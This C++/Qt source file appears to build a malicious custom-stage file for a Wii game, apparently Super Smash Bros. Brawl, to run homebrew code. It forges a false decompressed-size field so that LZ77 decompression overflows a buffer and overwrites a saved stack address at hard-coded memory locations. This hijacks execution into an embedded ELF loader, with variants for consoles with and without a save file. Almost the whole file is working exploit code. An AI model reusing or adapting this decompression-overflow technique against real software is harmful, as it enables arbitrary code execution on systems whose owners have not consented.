#include <QtCore/QCoreApplication>
#include <QFile>
#include <QDebug>

#include <QtGui/QApplication>
#include <QBuffer>
#include <QDir>
#include <QList>
#include <qendian.h>
#include <QRegExp>
#include "Crypter.h"
#include "lz77_11.h"

#define WITH_SAVE

#define RU(N, S) ((((N) + (S) - 1) / (S)) * (S))

QByteArray PaddedByteArray( const QByteArray &orig, quint32 padTo )
{
	QByteArray padding( RU( orig.size(), padTo ) - orig.size(), '\0' );
	return orig + padding;
}

QByteArray ReadFile( const QString &path )
{
	QFile file( path );
	if( !file.exists() || !file.open( QIODevice::ReadOnly ) )
	{
		qWarning() << "ReadFile -> can't open" << path;
		return QByteArray();
	}
	QByteArray ret = file.readAll();
	file.close();
	return ret;
}

bool WriteFile( const QString &path, const QByteArray &ba )
{
	QFile file( path );
	if( !file.open( QIODevice::WriteOnly | QIODevice::Truncate ) )
	{
		qWarning() << "WriteFile -> can't open" << path;
		return false;
	}
	if( file.write( ba ) != ba.size() )
	{
		file.close();
		qWarning() << "WriteFile -> can't write all the data to" << path;
		return false;
	}
	file.close();
	return true;
}

//lie about the size of the buffer the game should create
#define FAKE_UNC_SIZE 0x24a4

//one of the factors affecting where the game decides to put the buffer.  it doesnt have to be exact, as the game seems to align the buffer to 0x40
#define TARGET_SIZE 0x2b25

#ifdef WITH_SAVE   //this is the code used to create the hack that works when there is a save file for the game

//where will the decompression buffer be in memory ( affected by many factors )
#define MEM_START 0x9254E400

//where is the address stored on the stack that we are trying to overwrite?
#define STACK_VAR 0x9255b81c

//how big does this need to be in order to overwrite that variable?
#define PAYLOAD_SIZE ( ( STACK_VAR + 4 ) - MEM_START )

//where will the elfloader be in memory
#define ENTRYPOINT ( MEM_START + 0x14 )

//adjust for the fact that we are overwriting variables as the data is decompressed, skewing the results
#define ENTRYPOINT_ADJ ( ( ENTRYPOINT << 16 ) | ( ( ENTRYPOINT >> 16 ) & 0xffff ) )

QByteArray MakeHaxx()
{
	qDebug() << "making \"WITH_SAVE\" haxx";
	QByteArray loader = ReadFile( "../loader/loader.bin" );	//read elf loader
	if( loader.isEmpty() )									//you may get isues if you build the loader with a different compiler
	{														//than i did ( devkitPPC r17 ).  the size of the compressed data and its
		return QByteArray();								//content affect where the game will attempt to decompress it, and how it will be decompressed
	}
	quint32 tmp;
	QByteArray ret( PAYLOAD_SIZE, '\xff' );
	QBuffer b( &ret );
	b.open( QIODevice::WriteOnly );
	b.seek( 0x14 );
	b.write( loader );										//loader.  starts 0x14 after the start of the decrypted data.  why?  because i said so.

	//qDebug() << "entry_adj" << hex << ENTRYPOINT_ADJ;
	while( b.pos() < ret.size() )
	{
		tmp = qFromBigEndian( (quint32)ENTRYPOINT_ADJ );
		b.write( (char*)&tmp, 4 );							//write the loader entrypoint on the stack so it can be popped off
	}

	quint32 fix = 0;
	QByteArray cmpr = LZ77_11::Compress( ret );
	while( cmpr.size() < TARGET_SIZE )						//fill up with dirt to try to make target size
	{
		tmp = qFromBigEndian( fix++ );
		b.write( (char*)&tmp, 4 );
		cmpr = LZ77_11::Compress( ret );
	}
	b.close();
	qDebug() << "cmprSize:" << hex << cmpr.size();

	ret = PaddedByteArray( cmpr, 0x10 );					//pad to nearest 0x10

	quint32 fSize = ret.size();

	//create brawl stage header
	QByteArray bh( 0x20, '\0' );
	bh[ 0x14 ] = 0x41;										//PAL region ( doesnt really matter.  the game doesnt check this )
	bh[ 0x15 ] = 3;											//content type = custom stage
	bh[ 0x17 ] = 0xdb;										//constant
	b.setBuffer( &bh );
	b.open( QIODevice::WriteOnly );
	b.seek( 0x18 );
	tmp = qFromBigEndian( (quint32)FAKE_UNC_SIZE );			//incorrect decompressed size
	b.write( (char*)&tmp, 4 );
	tmp = qFromBigEndian( fSize );							//current size
	b.write( (char*)&tmp, 4 );
	b.close();
	bh += ret;												//combine compressed stuff and stage header

	ret = QByteArray( bh.size(), '\0' );					//create out buffer
	EncryptBuffer( bh.data(), ret.data(), bh.size() );		//encrypt
	return ret;
}

#else //and this is the code used to create the exploit that works when there is NOT a save file present on the wii memory

//where will the decompression buffer be in memory ( affected by many factors )
#define MEM_START 0x9254AB00

//where is the address stored on the stack that we are trying to overwrite?
#define STACK_VAR ( 0x92557EC8 + 0x30 + 4 )

//how big does this need to be in order to overwrite that variable?
#define PAYLOAD_SIZE ( ( STACK_VAR + 0x14 ) - MEM_START )

//where will the elfloader be in memory
#define ENTRYPOINT ( MEM_START + 0x14 )

//adjust for the fact that we are overwriting variables as the data is decompressed, skewing the results
#define ENTRYPOINT_ADJ ( ENTRYPOINT )

QByteArray MakeHaxx()
{
	qDebug() << "making \"NO_SAVE\" haxx";
	QByteArray loader = ReadFile( "../loader/loader.bin" );	//read elf loader
	if( loader.isEmpty() )									//you may get isues if you build the loader with a different compiler
	{														//than i did ( devkitPPC r17 ).  the size of the compressed data and its
		return QByteArray();								//content affect where the game will attempt to decompress it, and how it will be decompressed
	}
	quint32 tmp;
	QByteArray ret( PAYLOAD_SIZE, '\xff' );
	QBuffer b( &ret );
	b.open( QIODevice::WriteOnly );
	b.seek( 0x14 );
	b.write( loader );										//loader.  starts 0x14 after the start of the decrypted data

	//qDebug() << "entry_adj" << hex << ENTRYPOINT_ADJ;
	while( b.pos() < ret.size() - 0x20 )
	{
		tmp = qFromBigEndian( (quint32)ENTRYPOINT_ADJ );
		b.write( (char*)&tmp, 4 );							//write the loader entrypoint on the stack so it can be popped off
		tmp = qFromBigEndian( (quint32)0x80010101 );
		b.write( (char*)&tmp, 4 );							//keep the game from crashing before it pops the address off the stack ( instruction 80155010 in the PAl copy )
	}
	while( b.pos() < ret.size() )							//this loop is probably gratuitous.
	{
		tmp = qFromBigEndian( (quint32)ENTRYPOINT_ADJ );
		b.write( (char*)&tmp, 4 );							//write the loader entrypoint on the stack so it can be popped off
	}

	quint32 fix = 0;
	QByteArray cmpr = LZ77_11::Compress( ret );
	while( cmpr.size() < TARGET_SIZE )						//fill up with dirt to try to make target size
	{
		tmp = qFromBigEndian( fix++ );
		b.write( (char*)&tmp, 4 );
		cmpr = LZ77_11::Compress( ret );
	}
	b.close();
	qDebug() << "cmprSize:" << hex << cmpr.size();

	ret = PaddedByteArray( cmpr, 0x10 );					//pad to nearest 0x10

	quint32 fSize = ret.size();

	//create brawl stage header
	QByteArray bh( 0x20, '\0' );
	bh[ 0x14 ] = 0x41;										//PAL region
	bh[ 0x15 ] = 3;											//content type = custom stage
	bh[ 0x17 ] = 0xdb;										//constant
	b.setBuffer( &bh );
	b.open( QIODevice::WriteOnly );
	b.seek( 0x18 );
	tmp = qFromBigEndian( (quint32)FAKE_UNC_SIZE );			//incorrect decompressed size
	b.write( (char*)&tmp, 4 );
	tmp = qFromBigEndian( fSize );							//current size
	b.write( (char*)&tmp, 4 );
	b.close();
	bh += ret;												//combine compressed stuff and stage header

	ret = QByteArray( bh.size(), '\0' );					//create out buffer
	EncryptBuffer( bh.data(), ret.data(), bh.size() );		//encrypt
	return ret;
}

#endif //#ifdef WITH_SAVE

int main(int argc, char *argv[])
{
	QCoreApplication a(argc, argv);
	QStringList args = QCoreApplication::arguments();

	if( args.size() < 2 )
	{
		qDebug() << "args" << args;
		return 1;
	}
	WriteFile( args.at( 1 ), MakeHaxx() );
	return 0;
}
